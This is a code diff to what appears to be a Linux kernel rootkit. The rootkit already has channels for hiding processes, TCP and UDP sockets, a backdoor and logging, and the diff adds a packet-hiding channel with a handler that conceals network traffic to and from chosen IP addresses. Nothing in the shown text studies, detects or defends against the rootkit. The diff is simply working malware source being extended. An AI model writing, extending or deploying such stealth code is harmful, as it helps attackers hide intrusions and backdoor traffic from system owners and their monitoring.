@@ -16,6 +16,7 @@
 #include "ioctl.h"
 #include "rootkit.h"
 #include "sockhide.h"
+#include "packhide.h"
 
 #define BUFLEN 512
 
@@ -33,6 +34,7 @@ report_channels(void)
     DEBUG_NOTICE("%-24s %#10lx\n", "HIDEPID",  G7_PIDHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "TCPHIDE",  G7_TCPHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "UDPHIDE",  G7_UDPHIDE);
+    DEBUG_NOTICE("%-24s %#10lx\n", "PACKHIDE", G7_PACKHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "BACKDOOR", G7_BACKDOOR);
     DEBUG_NOTICE("%-24s %#10lx\n", "TOGGLEBD", G7_TOGGLEBD);
     DEBUG_NOTICE("%-24s %#10lx\n", "LOGGING",  G7_LOGGING);
@@ -50,6 +52,7 @@ detect_channel(unsigned cmd)
     case G7_PIDHIDE:  return (channel_t){ "HIDEPID",  handle_pidhide  };
     case G7_TCPHIDE:  return (channel_t){ "TCPHIDE",  handle_tcphide  };
     case G7_UDPHIDE:  return (channel_t){ "UDPHIDE",  handle_udphide  };
+    case G7_PACKHIDE: return (channel_t){ "PACKHIDE", handle_packhide };
     case G7_BACKDOOR: return (channel_t){ "BACKDOOR", handle_backdoor };
     case G7_TOGGLEBD: return (channel_t){ "TOGGLEBD", handle_togglebd };
     case G7_LOGGING:  return (channel_t){ "LOGGING",  handle_logging  };
@@ -230,6 +233,41 @@ handle_udphide(unsigned long arg)
         hide_port((port_t)sarg, udp6);
         DEBUG_NOTICE("[g7] hiding udp socket with port %ld\n", sarg);
     }
+
+    return 0;
+}
+
+int
+handle_packhide(unsigned long arg)
+{
+    char buf[BUFLEN];
+    memset(buf, 0, BUFLEN);
+    const char *sarg = (const char *)arg;
+
+    if (!sarg) {
+        unhide_packets();
+        rootkit.hiding_packets = 0;
+        DEBUG_NOTICE("[g7] packet hiding off\n");
+    } else if (!copy_from_user(buf, sarg, BUFLEN)
+        && (strstr(buf, ":") || strstr(buf, ".")))
+    {
+        if (sarg[0] == (char)1) {
+            if (!rootkit.hiding_packets) {
+                hide_packets();
+                DEBUG_NOTICE("[g7] packet hiding on\n");
+            }
+
+            hide_ip(&sarg[1]);
+            rootkit.hiding_packets = 1;
+            DEBUG_INFO("[g7] hiding packets from/to ip address %s\n", &sarg[1]);
+        } else if (sarg[0] == (char)-1) {
+            unhide_ip(&sarg[1]);
+            DEBUG_INFO("[g7] unhiding packets from/to ip address %s\n", &sarg[1]);
+        } else
+            return -ENOTTY;
+
+    } else
+        return -ENOTTY;
 
     return 0;
 }
